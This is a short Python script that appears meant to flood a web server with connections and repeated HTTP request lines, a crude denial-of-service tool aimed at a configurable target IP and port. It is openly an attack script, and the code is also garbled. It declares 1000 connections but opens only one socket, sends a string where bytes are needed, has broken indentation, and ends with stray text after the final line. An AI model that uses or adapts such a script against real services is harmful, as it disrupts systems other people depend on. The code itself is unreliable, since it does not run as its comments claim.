import socket
import time

# IP address of the target
target_ip = "127.0.0.1"
# Port number of the target
target_port = 80 
# Number of connections to make to the target 
num_connections = 1000 
# Length of time to keep the connections open (in seconds) 
duration = 10 

 # Create a socket object 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

 # Connect to the target IP and port 
sock.connect((target_ip, target_port)) 

 # Keep the connection alive for a certain duration  
start = time.time()  
while (time.time() - start) < duration:  

    # Send data to the target  
    sock.send("GET / HTTP/1.1\r\n")  

    # Close the connection when finished  
sock.close()@!RedX
